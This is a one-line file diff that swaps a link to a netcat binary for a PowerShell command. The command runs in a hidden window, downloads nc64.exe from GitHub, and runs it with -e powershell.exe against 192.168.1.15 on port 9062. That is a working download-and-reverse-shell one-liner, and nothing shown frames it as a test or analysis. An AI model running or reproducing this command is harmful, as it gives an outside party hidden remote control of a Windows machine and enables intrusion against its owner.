@@ -1,1 +1,1 @@
-https://github.com/diegocr/netcat/blob/master/nc.exe
+powershell.exe -windowstyle hidden {powershell Start-BitsTransfer -Source 'https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=true' -Destination $pwd/nc.exe; .\nc.exe 192.168.1.15 9062 -e powershell.exe}
